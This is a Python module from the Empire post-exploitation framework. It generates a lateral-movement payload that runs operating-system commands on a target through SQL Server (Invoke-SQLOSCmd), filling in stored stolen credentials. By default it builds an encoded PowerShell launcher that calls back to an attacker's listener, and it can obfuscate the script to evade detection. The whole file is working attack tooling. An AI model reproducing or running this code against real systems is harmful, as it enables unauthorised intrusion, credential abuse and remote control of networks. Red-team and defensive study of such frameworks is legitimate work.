from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.database.models import Credential
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):

        cred_id = params["CredID"]
        if cred_id != "":
            if not main_menu.credentials.is_credential_valid(cred_id):
                return handle_error_message("[!] CredID is invalid!")
            cred: Credential = main_menu.credentials.get_credentials(cred_id)
            if cred.domain != "":
                params["UserName"] = str(cred.domain) + "\\" + str(cred.username)
            else:
                params["UserName"] = str(cred.username)
            if cred.password != "":
                params["Password"] = cred.password

        # Set booleans to false by default
        obfuscate = False

        listener_name = params['Listener']
        userAgent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        instance = params['Instance']
        command = params['Command']
        username = params['UserName']
        password = params['Password']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']


        module_source = main_menu.installPath + "/data/module_source/lateral_movement/Invoke-SQLOSCmd.ps1"
        module_code = ""
        if obfuscate:
            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            with open(module_source, 'r') as source:
                module_code = source.read()
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))
        script = module_code


        if command == "":
            if not main_menu.listeners.is_listener_valid(listener_name):
                return handle_error_message("[!] Invalid listener: " + listener_name)
            else:
                launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                               obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
                                                               userAgent=userAgent, proxy=proxy, proxyCreds=proxy_creds,
                                                               bypasses=params['Bypasses'])
                if launcher == "":
                    return handle_error_message("[!] Error generating launcher")
                else:
                    command = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher


        script_end = "Invoke-SQLOSCmd -Instance \"%s\" -Command \"%s\"" % (instance, command)

        if username != "":
            script_end += " -UserName "+username
        if password != "":
            script_end += " -Password "+password

        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
